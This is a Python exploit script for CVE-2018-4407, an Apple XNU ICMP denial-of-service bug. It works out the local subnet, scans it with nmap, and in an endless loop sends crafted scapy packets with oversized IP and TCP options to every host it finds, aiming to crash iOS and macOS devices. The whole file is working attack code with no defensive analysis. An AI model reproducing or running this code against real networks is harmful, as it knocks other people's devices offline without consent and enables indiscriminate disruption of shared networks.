#!/usr/bin/env python3
"""
    # CVE-2018-4407 ICMP DOS
    # https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407
    # from https://twitter.com/ihackbanme
"""
import re
import time
import subprocess
import multiprocessing

try:
    from scapy.all import *
except Exception as e:
    print("[*] You need install scapy first:\n[*] sudo pip install scapy ")
    exit(0)


def probe_getway():
    """
    # probe getway
    :return:
    """
    getway_ip = re.findall("\d+\.\d+\.\d+\.255", subprocess.getoutput("ip addr"), re.M | re.I)

    getway_txt = getway_ip[0].replace("255", "0")

    return getway_txt


def start_nmap():
    """
    # nmap scan
    :return:
    """
    nmap_log = subprocess.getoutput("sudo nmap -sP " + probe_getway() + "/24")

    ip_list = [(i.strip().lstrip("(").strip(")"))
               for i in re.findall("\d+\.\d+\.\d+\.\d+", nmap_log, re.M | re.I)]

    if not ip_list:
        print("No any ip or re_rule error!")
        exit(0)

    print(ip_list)

    return ip_list


def exp_apple(check_ip):
    """
    # exp ios device
    :param check_ip:
    :return:
    """
    try:
        print("-----------------------------------")
        print("[*] !!!!!!Dangerous operation!!!!!!")
        print("[*] Trying CVE-2018-4407 ICMP DOS " + check_ip)
        for i in range(8, 20):
            send(IP(dst=check_ip, options=[IPOption(
                "A" * i)]) / TCP(dport=2323, options=[(19, "1" * 18), (19, "2" * 18)]))
            print("[*] Check Over!! ")
    except Exception as e:
        print("[*] usage: sudo python3 exp.py")


def main(ip_list):
    """
    # main()
    :param ip_list:
    :return:
    """
    for i in ip_list:
        # mulit process
        mulit_process = multiprocessing.Process(target=exp_apple, args=("%s" % i,))
        mulit_process.start()


if __name__ == '__main__':
    while True:
        ip_list = start_nmap()
        main(ip_list)
        time.sleep(3)
